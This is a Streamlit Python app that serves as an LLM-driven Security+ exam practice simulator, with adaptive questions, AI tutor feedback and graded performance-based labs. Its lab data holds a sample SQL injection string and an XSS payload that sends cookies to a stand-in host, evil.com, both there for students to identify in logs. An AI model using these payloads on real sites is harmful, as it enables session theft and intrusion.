import streamlit as st
import os
import time
import random
import urllib.parse
from dotenv import load_dotenv
from langchain_groq import ChatGroq
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_community.vectorstores import FAISS
from langchain_core.prompts import PromptTemplate
from langchain_core.output_parsers import StrOutputParser

# 1. PAGE CONFIGURATION
load_dotenv()
st.set_page_config(page_title="Security+ SY0-701 Adaptive Sim", page_icon="🛡️", layout="wide")

# 2. SECURE RESOURCE LOADING
@st.cache_resource
def load_resources():
    api_key = st.secrets.get("GROQ_API_KEY") or os.getenv("GROQ_API_KEY")
    if not api_key:
        st.error("🔑 GROQ_API_KEY is missing in Streamlit Secrets!")
        st.stop()
    try:
        embeddings = HuggingFaceEmbeddings(model_name="sentence-transformers/all-MiniLM-L6-v2")
        vectorstore = FAISS.load_local("faiss_index", embeddings, allow_dangerous_deserialization=True)
        llm = ChatGroq(temperature=0, model_name="llama-3.3-70b-versatile", groq_api_key=api_key)
        return vectorstore, llm
    except Exception as e:
        st.error(f"Critical Initialization Error: {e}")
        return None, None

# 3. AI LOGIC: INVISIBLE ADAPTIVE PARSER
def get_adaptive_question(llm, raw_text, difficulty):
    template = """
    Extract ONE CompTIA Security+ question EXACTLY as written. 
    DIFFICULTY TARGET: {difficulty}
    If the text is a disclaimer or doesn't match, return: SKIP.
    RAW TEXT: {raw_text}
    FORMAT:
    QUESTION: [text]
    A: [text]
    B: [text]
    C: [text]
    D: [text]
    CORRECT: [A, B, C, or D]
    CRITICAL INSTRUCTION: Stop generating text immediately after providing the single CORRECT letter.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"raw_text": raw_text[:1200], "difficulty": difficulty})

# 4. AI LOGIC: ADAPTIVE TEACHING TUTOR
def get_tutor_feedback(llm, question, user_ans, correct_letter, is_right, difficulty):
    result_text = "Correct" if is_right else "Incorrect"
    template = """
    You are an expert CompTIA Security+ Tutor. 
    Question: {question}
    Student Choice: {user_ans}
    Correct Answer: {correct_letter}
    Result: {result}
    Student's Current Hidden Level: {difficulty}
    
    Task: Write a smooth explanation.
    1. EASY Level: Use a simple, real-world analogy. Focus on building confidence.
    2. HARD Level: Go deeper into the technical "why" and provide an advanced pro-tip.
    3. Explicitly state why the correct answer is the BEST choice and the flaw in their selection.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"question": question, "user_ans": user_ans, "correct_letter": correct_letter, "result": result_text, "difficulty": difficulty})

# 5. AI LOGIC: TOPIC EXTRACTOR & PBQ GRADER
def get_video_topic(llm, question):
    template = "Analyze this Security+ question and extract the ONE core concept in 2 to 4 words. Question: {question}\nOutput ONLY the short topic name."
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"question": question})

def grade_pbq(llm, pbq_title, pbq_scenario, user_answers):
    template = """
    You are a CompTIA PBQ (Performance-Based Question) Grader.
    PBQ Title: {title}
    Scenario: {scenario}
    Student's Submitted Configuration/Answers: {answers}
    
    Task:
    1. Determine if the student's configuration is entirely correct.
    2. Explain exactly why each part is right or wrong.
    3. Provide the definitive correct configuration.
    Keep it structured, encouraging, and highly technical.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"title": pbq_title, "scenario": pbq_scenario, "answers": str(user_answers)})

# 6. PBQ DATABASE (1 to 12, Hardest at the end)
PBQ_DB = {
    1: {"title": "Port Configuration", "desc": "Match the default port to the network service.", "type": "match", "keys": ["SSH", "HTTPS", "RDP", "DNS"]},
    2: {"title": "Auth Factors", "desc": "Categorize the MFA factors (Know, Have, Are).", "type": "match", "keys": ["Password", "Smartcard", "Retina Scan", "PIN"]},
    3: {"title": "Malware Identification", "desc": "Match the behavior to the malware type (Ransomware, Rootkit, Trojan, Worm).", "type": "match", "keys": ["Encrypts files for payment", "Hides in OS kernel", "Self-replicates across network", "Disguises as legitimate software"]},
    4: {"title": "Incident Response Lifecycle", "desc": "Order the phases of Incident Response (1-4).", "type": "order", "keys": ["Preparation", "Identification", "Containment", "Eradication"]},
    5: {"title": "Cryptography Types", "desc": "Classify as Symmetric or Asymmetric.", "type": "match", "keys": ["AES", "RSA", "DES", "ECC"]},
    6: {"title": "Cloud Deployment Models", "desc": "Classify as IaaS, PaaS, or SaaS.", "type": "match", "keys": ["AWS EC2", "Salesforce", "Google App Engine", "Microsoft Azure VMs"]},
    7: {"title": "Basic Firewall Rule", "desc": "Configure a rule to block HTTP traffic from 192.168.1.50 to the web server.", "type": "firewall"},
    8: {"title": "RAID Configuration", "desc": "Select the best RAID for the given scenarios.", "type": "match", "keys": ["High Performance, No Fault Tolerance", "Mirroring", "Striping with Parity (Min 3 drives)"]},
    9: {"title": "Log Analysis: SQL Injection", "desc": "Analyze the web log and identify the malicious payload parameter.", "type": "log", "log": '10.0.0.5 - - [10/Oct] "GET /login.php?user=admin\' OR \'1\'=\'1&pass=123 HTTP/1.1" 200 4321'},
    10: {"title": "Log Analysis: XSS", "desc": "Analyze the log and identify the Cross-Site Scripting attack vector.", "type": "log", "log": '192.168.1.10 - - [12/Oct] "POST /comment.php?body=<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script> HTTP/1.1" 200'},
    11: {"title": "Digital Certificates", "desc": "Match the certificate component to its definition.", "type": "match", "keys": ["CSR", "CRL", "Public Key", "Private Key"]},
    12: {"title": "Advanced ACL Troubleshooting", "desc": "Review the firewall rules. A user at 10.1.1.5 cannot reach the HTTPS web server at 10.2.2.10. Identify the misconfigured rule number.", "type": "log", "log": "Rule 1: DENY IP 10.1.1.0/24 to 10.2.2.0/24 PORT 80\nRule 2: DENY IP ANY to 10.2.2.10 PORT 443\nRule 3: ALLOW IP 10.1.1.0/24 to ANY PORT ANY\nRule 4: DENY ALL ALL"}
}

# 7. MAIN APPLICATION
def main():
    st.title("🛡️ Security+ SY0-701 Pro Simulator")
    vectorstore, llm = load_resources()
    if not vectorstore: return

    # --- STATE INITIALIZATION ---
    if 'app_mode' not in st.session_state:
        st.session_state.clear()
        docs = vectorstore.similarity_search("Security+ practice question", k=150)
        random.shuffle(docs)
        
        st.session_state.all_docs = docs
        st.session_state.db_idx = 0         
        st.session_state.display_idx = 1    
        st.session_state.correct_count = 0  
        st.session_state.wrong_count = 0    
        st.session_state.streak = 0
        st.session_state.difficulty = "NORMAL"
        
        st.session_state.current_q = None   
        st.session_state.phase = "answering" 
        st.session_state.feedback = ""
        st.session_state.user_choice = None
        st.session_state.is_right = False
        st.session_state.rehab_topic = ""
        
        st.session_state.app_mode = "Adaptive Simulator"
        st.session_state.pbq_feedback = ""

    # --- SIDEBAR NAVIGATION ---
    with st.sidebar:
        st.header("🧭 Exam Navigation")
        selected_mode = st.radio("Select Training Mode:", ["Adaptive Simulator", "PBQ Practice Lab"])
        
        if selected_mode != st.session_state.app_mode:
            st.session_state.app_mode = selected_mode
            st.rerun()

        st.markdown("---")
        
        if st.session_state.app_mode == "Adaptive Simulator":
            st.header("📊 Exam Progress")
            st.write(f"**Question:** {st.session_state.display_idx} / 90")
            st.success(f"✅ Correct: {st.session_state.correct_count}")
            st.error(f"❌ Wrong: {st.session_state.wrong_count}")
        
        st.markdown("---")
        st.header("📺 Quick Review Topics")
        topics = ["1.0 General Concepts", "2.0 Threats & Mitigations", "3.0 Architecture", "4.0 Security Operations", "5.0 Program Management"]
        for topic in topics:
            query = urllib.parse.quote(f"Professor Messer SY0-701 {topic}")
            st.markdown(f"- [{topic}](https://www.youtube.com/results?search_query={query})")
            
        st.markdown("---")
        if st.button("🔄 Reset Entire App"):
            st.session_state.clear()
            st.rerun()

    # ==========================================
    # MODE 1: PBQ PRACTICE LAB
    # ==========================================
    if st.session_state.app_mode == "PBQ Practice Lab":
        st.header("💻 Performance-Based Questions (PBQs)")
        st.write("PBQs test your hands-on ability to solve problems. Select a scenario below. Difficulty increases from 1 to 12.")
        
        pbq_id = st.selectbox("Select PBQ Scenario:", list(PBQ_DB.keys()), format_func=lambda x: f"PBQ {x}: {PBQ_DB[x]['title']} (Level {x})")
        
        pbq = PBQ_DB[pbq_id]
        st.info(f"**Scenario:** {pbq['desc']}")
        
        # Build Dynamic Form based on PBQ Type
        user_submission = {}
        with st.form(f"pbq_form_{pbq_id}"):
            if pbq['type'] == "match" or pbq['type'] == "order":
                for key in pbq['keys']:
                    user_submission[key] = st.text_input(f"{key}:")
            elif pbq['type'] == "firewall":
                col1, col2, col3, col4 = st.columns(4)
                user_submission['Action'] = col1.selectbox("Action", ["ALLOW", "DENY"])
                user_submission['Protocol'] = col2.selectbox("Protocol", ["TCP", "UDP", "ICMP", "ANY"])
                user_submission['Source IP'] = col3.text_input("Source IP")
                user_submission['Dest Port'] = col4.text_input("Dest Port")
            elif pbq['type'] == "log":
                st.code(pbq['log'], language='bash')
                user_submission['Answer'] = st.text_input("Enter your finding/answer here:")

            submit_pbq = st.form_submit_button("Submit Configuration")
        
        if submit_pbq:
            with st.spinner("AI Tutor is grading your PBQ..."):
                st.session_state.pbq_feedback = grade_pbq(llm, pbq['title'], pbq['desc'], user_submission)
        
        if st.session_state.pbq_feedback:
            st.markdown("---")
            st.warning("🤖 **AI PBQ Evaluation:**")
            st.write(st.session_state.pbq_feedback)
            if st.button("Clear Feedback"):
                st.session_state.pbq_feedback = ""
                st.rerun()

    # ==========================================
    # MODE 2: ADAPTIVE SIMULATOR (ORIGINAL)
    # ==========================================
    elif st.session_state.app_mode == "Adaptive Simulator":
        # Adaptive Logic
        if st.session_state.streak >= 3: st.session_state.difficulty = "HARD"
        elif st.session_state.streak <= -3: st.session_state.difficulty = "EASY"
        else: st.session_state.difficulty = "NORMAL"

        if st.session_state.display_idx > 90:
            st.balloons()
            st.success(f"🎉 Exam Finished! Final Score: {st.session_state.correct_count} / 90")
            return

        # Fetch Question
        if st.session_state.current_q is None:
            with st.spinner("AI Tutor is finding your next question..."):
                while st.session_state.db_idx < len(st.session_state.all_docs):
                    time.sleep(1.2)
                    raw_content = st.session_state.all_docs[st.session_state.db_idx].page_content
                    formatted = get_adaptive_question(llm, raw_content, st.session_state.difficulty)
                    if "SKIP" not in formatted and "QUESTION:" in formatted:
                        try:
                            q_text = formatted.split("QUESTION:")[1].split("A:")[0].strip()
                            a_opt = formatted.split("A:")[1].split("B:")[0].strip()
                            b_opt = formatted.split("B:")[1].split("C:")[0].strip()
                            c_opt = formatted.split("C:")[1].split("D:")[0].strip()
                            d_opt = formatted.split("D:")[1].split("CORRECT:")[0].strip()
                            correct_letter = formatted.split("CORRECT:")[1].strip()[0].upper()
                            
                            st.session_state.current_q = {
                                "text": q_text, "options": [f"A: {a_opt}", f"B: {b_opt}", f"C: {c_opt}", f"D: {d_opt}"], "correct_letter": correct_letter
                            }
                            break 
                        except Exception: st.session_state.db_idx += 1 
                    else: st.session_state.db_idx += 1 

        if st.session_state.current_q is None:
            st.error("Ran out of study material.")
            return

        cq = st.session_state.current_q
        
        # ANSWERING PHASE
        if st.session_state.phase == "answering":
            st.subheader(f"Question {st.session_state.display_idx}")
            st.info(cq["text"])
            selected_option = st.radio("Select your answer:", cq["options"], index=None)

            if st.button("Submit Answer"):
                if selected_option is None: st.warning("⚠️ Please select an answer.")
                else:
                    user_letter = selected_option.split(":")[0].strip()
                    is_right = (user_letter == cq["correct_letter"])
                    
                    if is_right:
                        st.session_state.correct_count += 1
                        st.session_state.streak = st.session_state.streak + 1 if st.session_state.streak > 0 else 1
                    else:
                        st.session_state.wrong_count += 1
                        st.session_state.streak = st.session_state.streak - 1 if st.session_state.streak < 0 else -1
                    
                    st.session_state.user_choice = selected_option
                    st.session_state.is_right = is_right
                    with st.spinner("AI Tutor is writing your explanation..."):
                        st.session_state.feedback = get_tutor_feedback(llm, cq["text"], selected_option, cq["correct_letter"], is_right, st.session_state.difficulty)
                    st.session_state.phase = "reviewing"
                    st.rerun()

        # REVIEWING PHASE
        elif st.session_state.phase == "reviewing":
            st.subheader(f"Question {st.session_state.display_idx}")
            st.info(cq["text"])
            st.radio("Your answer:", cq["options"], index=cq["options"].index(st.session_state.user_choice), disabled=True)
            st.markdown("---")
            if st.session_state.is_right: st.success(f"✅ Correct! The answer is {cq['correct_letter']}.")
            else: st.error(f"❌ Incorrect. The correct answer was {cq['correct_letter']}.")
            
            st.warning("🤖 **AI Tutor Explanation:**")
            st.write(st.session_state.feedback)
            st.markdown("<br>", unsafe_allow_html=True)
            
            if st.button("Next Question ➡️"):
                if st.session_state.streak <= -3:
                    with st.spinner("Preparing your study timeout..."):
                        st.session_state.rehab_topic = get_video_topic(llm, cq["text"])
                    st.session_state.phase = "video_rehab"
                    st.rerun()
                else:
                    st.session_state.db_idx += 1        
                    st.session_state.display_idx += 1   
                    st.session_state.current_q = None   
                    st.session_state.phase = "answering"
                    st.rerun()

        # VIDEO REHAB PHASE
        elif st.session_state.phase == "video_rehab":
            st.error("🛑 Study Timeout Triggered: You've missed 3 questions in a row.")
            st.write("When we guess, we stop learning. Let's review this concept before moving forward.")
            st.markdown("---")
            st.subheader(f"📚 Recommended Review Topic: **{st.session_state.rehab_topic}**")
            
            query = urllib.parse.quote(f"Professor Messer SY0-701 {st.session_state.rehab_topic}")
            st.markdown(f"### 📺 [Click Here to Search YouTube for '{st.session_state.rehab_topic}' Lessons](https://www.youtube.com/results?search_query={query})")
            
            user_done = st.text_input("Type **done** when you have finished reviewing:")
            if user_done.strip().lower() == "done":
                st.success("Great job reviewing! Let's get back into the exam.")
                if st.button("Resume Exam ➡️"):
                    st.session_state.streak = 0
                    st.session_state.db_idx += 1        
                    st.session_state.display_idx += 1   
                    st.session_state.current_q = None   
                    st.session_state.phase = "answering"
                    st.rerun()

if __name__ == "__main__":
    main()
